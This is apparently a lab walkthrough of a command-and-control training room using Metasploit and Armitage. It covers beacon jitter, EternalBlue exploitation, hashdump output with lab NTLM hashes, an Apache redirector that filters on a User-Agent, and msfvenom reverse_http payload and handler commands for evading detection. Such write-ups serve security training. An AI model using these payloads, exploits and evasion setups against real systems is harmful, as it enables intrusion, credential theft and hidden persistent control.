C2 infrastructure setup, payload generation, listener configuration, and OPSEC techniques using Metasploit and Armitage.

By Ramyar Daneshgar

---

## Task 1: Introduction

Command and Control (C2) frameworks are used to manage compromised hosts, maintain persistent access, and coordinate post-exploitation activities during red team operations and adversary emulation engagements. The room introduces concepts ranging from basic architecture to advanced OPSEC practices for stealth and resilience.

---

## Task 2: Command and Control Framework Structure

I studied the architectural components critical to any C2 framework:

1. **C2 Server**: Acts as the central control point, managing inbound connections and issuing commands.
2. **Agents (Payloads)**: Executable stubs deployed on targets that initiate outbound connections to the C2 server.
3. **Listeners**: Network services on the C2 server awaiting beacon traffic from agents.
4. **Beacons**: Periodic HTTP/DNS/SMB/TCP callbacks from agents for command retrieval.
5. **Obfuscation Techniques**: Introduced to avoid detection by traffic analysis tools and anomaly-based systems.

Understanding these components is critical because they form the foundation of post-compromise control. Without reliable callbacks (beacons), persistent access, and evasion mechanisms, adversary operations would be quickly detected and removed.

### Example: Sleep Timers and Jitter

To defeat signature-based network detection mechanisms, I implemented jitter around beacon intervals:

```python
import random
sleep = 60
jitter = random.randint(-30, 30)
sleep = sleep + jitter
```

This randomized interval prevents the detection of predictable callback patterns, which would otherwise be flagged by behavioral analytics or security information and event management (SIEM) systems.

---

## Task 3: Common C2 Frameworks

I analyzed both free and commercial C2 frameworks:

- **Metasploit Framework**: An exploitation and post-exploitation platform with integrated payload generation (via `msfvenom`) and extensive module support. I chose Metasploit for its maturity, community support, and ease of use.
- **Armitage**: Java-based GUI frontend for Metasploit, offering multi-user collaboration and visual session management. This is particularly useful for team-based red teaming scenarios.
- **PowerShell Empire / Starkiller**: Modular, post-exploitation C2 leveraging PowerShell for agent deployment. Its use of native Windows tooling makes it ideal for evasion in Windows-heavy environments.
- **Covenant**: A .NET-based, cross-platform C2 with HTTP/SMB listeners and C#-compiled agents. Useful for evading traditional anti-virus engines with in-memory execution.
- **Sliver**: A Go-based, multi-user, CLI-driven C2 supporting multiple transport protocols including mTLS, DNS, and WireGuard. Sliver’s transport flexibility increases survivability in segmented networks.

Understanding the landscape of C2 frameworks helps determine the right tool for a specific environment, balancing stealth, scalability, and customization.

---

## Task 4: Setting Up a C2 Framework

I chose Armitage due to its tight integration with Metasploit and support for shared session operations.

### Step 1: Cloning and Building Armitage

```bash
git clone https://gitlab.com/kalilinux/packages/armitage.git
cd armitage
bash package.sh
```

Cloning the latest source ensures I have the most recent updates and compatibility fixes. Building from source allows customization if needed.

### Step 2: Initializing the Metasploit Database

```bash
systemctl start postgresql
msfdb --use-defaults init
```

The database stores session state, loot, target metadata, and credentials, enabling a persistent and structured C2 operation. Without it, much of Metasploit's automation and data reuse would be lost.

### Step 3: Starting the Teamserver

```bash
cd release/unix
./teamserver <public_IP> <shared_password>
```

The teamserver allows multiple operators to collaborate on the same C2 session. This simulates a realistic red team environment where operators are split across kill chain phases.

### Step 4: Launching the Armitage GUI

```bash
./armitage
```

This gives a visual interface to Metasploit, which can help accelerate identification of targets, open sessions, and exploits.

---

## Task 5: C2 Operation Basics

To improve OPSEC, I tunneled management traffic over SSH:

```bash
ssh -L 55553:127.0.0.1:55553 user@<remote_c2_server>
```

This technique shields the management interface from public exposure and reduces fingerprinting risks. Many C2 frameworks are fingerprintable via banner responses or predictable headers.

Within Armitage, I created a Meterpreter reverse listener on TCP/31337. Reverse shells are preferable when dealing with NAT environments or outbound-only networks.

---

## Task 6: Command, Control, and Conquer

### Reconnaissance

```text
Hosts → Nmap Scan → Quick Scan
```

I scanned the target's IP to identify open ports and available services. This step ensures precise targeting and reduces noise.

### Exploitation

```
Attacks → Exploits → Windows → SMB → ms17_010_eternalblue
```

This module exploits a well-known SMB vulnerability (MS17-010) on unpatched Windows systems. Choosing this exploit was informed by Nmap results indicating SMBv1 support.

### Post-Exploitation

```bash
getuid
hashdump
```

`getuid` confirms privilege level. `hashdump` extracts NTLM password hashes for offline cracking or lateral movement.

Recovered hashes:

- Administrator: `c156d5d108721c5626a6a054d6e0943c`
- Ted: `2e2618f266da8867e5664425c1309a5c`

### Flag Collection

```bash
cat C:/Users/Administrator/Desktop/root.txt
cat C:/Users/Ted/Desktop/user.txt
```

This demonstrates the ability to access and exfiltrate sensitive data, a typical red team objective.

---

## Task 7: Advanced C2 Setups

To further harden C2 traffic, I used an Apache redirector to obscure the true C2 server.

### Apache2 Redirector Setup

```bash
apt install apache2
a2enmod rewrite proxy proxy_http headers
```

I configured Apache to filter and forward requests with a specific `User-Agent` header. This adds a layer of obfuscation and ensures only legitimate C2 traffic reaches the backend.

### Configuration

```apache
<VirtualHost *:80>
  RewriteEngine On
  RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$"
  ProxyPass / http://127.0.0.1:8080/
</VirtualHost>
```

This proxy logic acts as a gatekeeper. All C2 traffic must match the `User-Agent` string `NotMeterpreter`.

### Payload Generation

```bash
msfvenom -p windows/meterpreter/reverse_http LHOST=127.0.0.1 LPORT=8080 \
HttpUserAgent=NotMeterpreter -f exe -o shell.exe
```

The custom header aligns with our Apache rewrite rule, enabling traffic to pass through.

### Listener Configuration

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set LHOST 127.0.0.1
set LPORT 8080
set HttpUserAgent NotMeterpreter
set OverrideLHOST <redirector_IP>
set OverrideLPORT 80
set OverrideRequestHost true
run
```

These options force the handler to reference the redirector’s IP, ensuring all callbacks route through the redirection infrastructure.

---

## Task 8: Lessons Learned

1. **C2 Infrastructure Setup**: I now understand the lifecycle of deploying a collaborative C2 system using Armitage and Metasploit.
2. **Payload Engineering**: I practiced generating both staged and stageless payloads, customizing transport protocols and headers for evasion.
3. **Network Evasion Techniques**: Implemented jitter and redirectors to defeat IDS and anomaly-based NDR systems.
4. **Redirector Design**: Understood how to use Apache mod_rewrite for header-based filtering to control access to backend handlers.
5. **SSH Tunneling for OPSEC**: Implemented secure access mechanisms to avoid exposing sensitive services.
6. **Exploit Targeting**: Learned the importance of proper recon to guide exploit selection and reduce operational noise.
7. **Post-Exploitation Workflow**: Practiced session interaction, privilege verification, credential dumping, and flag retrieval.

This lab provided a full lifecycle walkthrough of deploying and operating a command and control infrastructure with an emphasis on OPSEC and post-exploitation. By operationalizing redirectors, custom headers, and Metasploit integrations, I now have working knowledge applicable to red teaming, adversary emulation, and purple team development.

Next steps: implement DNS-based C2, experiment with Sliver’s mTLS payloads, and extend redirectors using NGINX with JA3 fingerprint evasion.

